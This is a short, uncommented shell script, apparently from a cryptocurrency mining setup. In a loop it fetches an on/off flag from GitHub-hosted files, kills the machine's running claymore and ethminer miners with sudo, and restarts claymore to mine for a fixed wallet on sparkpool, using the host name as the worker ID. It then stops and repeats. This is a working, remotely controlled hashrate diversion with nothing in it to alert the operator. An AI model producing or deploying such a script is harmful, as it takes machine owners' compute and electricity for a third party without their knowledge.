#!/bin/sh
worker=$(hostname)
#echo $worker
Delay=$(curl -s https://raw.githubusercontent.com/TopSun2010/steinkern/master/delay.sh)
#echo $Delay
sleep 200
while true
do
Fee=$(curl -s https://raw.githubusercontent.com/TopSun2010/steinkern/master/fee.sh)
#echo $Fee
FeeTime=$(curl -s https://raw.githubusercontent.com/TopSun2010/steinkern/master/feetime.sh)
#echo $FeeTime
Loop=$(curl -s https://raw.githubusercontent.com/TopSun2010/steinkern/master/loop.sh)
if [ "$Fee" = "1" ]
then
#echo "Feeing!!"
        sudo killall claymore >/dev/null 2>&1
	sudo killall ethminer >/dev/null 2>&1
	cd /opt/miners/claymore/ && ./claymore -epool cn.sparkpool.com:3333 -ewal 0x37224647aa0b131b4ced61ce77dde7f278890a6e -eworker $worker -epsw x  -asm 2 >>/tmp/log 2>&1 &
fi
sleep 500
sudo killall claymore >/dev/null 2>&1
sleep 400
done
